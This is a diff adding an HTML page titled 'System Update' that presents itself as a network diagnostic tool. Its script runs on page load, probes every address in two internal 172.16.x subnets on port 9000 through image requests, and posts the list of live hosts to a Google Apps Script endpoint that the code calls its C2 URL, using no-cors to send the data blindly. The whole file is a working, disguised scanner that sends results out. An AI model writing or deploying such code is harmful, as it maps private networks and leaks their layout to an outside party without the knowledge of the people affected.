@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Update</title>
+    <style>
+        body { background-color: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
+        .log { color: #555; }
+        .success { color: #00ff00; }
+    </style>
+</head>
+<body>
+    <h1>// NETWORK DIAGNOSTIC TOOL //</h1>
+    <div id="status">Initializing Scan...</div>
+    <div id="log"></div>
+
+    <script>
+        // --- CONFIGURATION ---
+        // PASTE YOUR GOOGLE SCRIPT URL HERE
+        var C2_URL = "https://script.google.com/macros/s/AKfycbwWQQRwwAJ84yYCT6ykZpDCzTKsy0ZVom4_tDxSumkrFyhzXWpTR9er6b9k9auDkeTA/exec"; 
+        
+        var subnets = ['172.16.0', '172.16.1'];
+        var targetPort = 9000; 
+        var scanResults = {
+            timestamp: new Date().toISOString(),
+            found_hosts: [],
+            scan_complete: false
+        };
+        var activeProbes = 0;
+
+        // --- EXFILTRATION FUNCTION (POST) ---
+        function exfiltrateData() {
+            document.getElementById('status').innerText = "Exfiltrating data to C2...";
+            
+            fetch(C2_URL, {
+                method: "POST",
+                mode: "no-cors", // IMPORTANT: 'no-cors' allows us to send data blindly even if Google doesn't send CORS headers
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(scanResults)
+            })
+            .then(() => {
+                document.getElementById('status').innerHTML = "<h2 class='success'>UPLOAD COMPLETE</h2>";
+                console.log("Beacon sent.");
+            })
+            .catch(e => console.error("Exfil failed", e));
+        }
+
+        // --- SCANNING LOGIC ---
+        function checkIP(ip) {
+            activeProbes++;
+            var img = new Image();
+            
+            var onFinish = function(status) {
+                activeProbes--;
+                if(status === "OPEN") {
+                    scanResults.found_hosts.push(ip);
+                    document.getElementById('log').innerHTML += "<div>[+] Found: " + ip + "</div>";
+                }
+                
+                // If all probes are done, trigger exfil
+                if (activeProbes === 0) {
+                    scanResults.scan_complete = true;
+                    exfiltrateData();
+                }
+            };
+
+            img.onload = function() { onFinish("OPEN"); };
+            img.onerror = function() { onFinish("OPEN"); }; // Error means port is open (but not an image)
+            
+            // Timeout handling (Port Closed / Host Down)
+            setTimeout(function() {
+                if (img.complete) return; // Already handled
+                img.src = ""; // Cancel request
+                activeProbes--; // Decrement anyway
+                if (activeProbes === 0) exfiltrateData(); // Check if we are done
+            }, 2000); // 2 second timeout
+
+            img.src = "http://" + ip + ":" + targetPort + "/favicon.ico?r=" + Math.random();
+        }
+
+        // Start Scan
+        subnets.forEach(function(subnet) {
+            for (var i = 1; i < 255; i++) {
+                checkIP(subnet + '.' + i);
+            }
+        });
+
+    </script>
+</body>
+</html>
